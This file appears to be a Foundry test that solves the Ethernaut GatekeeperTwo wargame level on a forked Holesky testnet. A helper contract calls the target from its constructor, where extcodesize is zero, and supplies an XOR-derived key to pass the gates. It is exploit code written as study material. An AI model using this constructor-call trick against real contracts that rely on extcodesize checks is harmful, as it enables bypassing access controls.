// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {GatekeeperTwo} from "../../src/Ethernaut/GatekeeperTwo.sol";

contract GatekeeperTwoAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;

        vm.startPrank(playerAddress, playerAddress);
        new Helper();
        vm.stopPrank();

        GatekeeperTwo gatekeeperTwo = GatekeeperTwo(
            0xCfcAA3e3B0Ee23052aE1F8dB69c5Df899543B298
        );
        assertTrue(gatekeeperTwo.entrant() == playerAddress);
    }
}

contract Helper {
    // construct 阶段extcodesize仍为0；因此只用extcodesize来判断调用者是合约还是eoa并不一定准确
    constructor() {
        bytes8 key = bytes8(
            type(uint64).max ^
                uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
        );
        address(0xCfcAA3e3B0Ee23052aE1F8dB69c5Df899543B298).call(
            abi.encodeCall(GatekeeperTwo.enter, key)
        );
    }
}
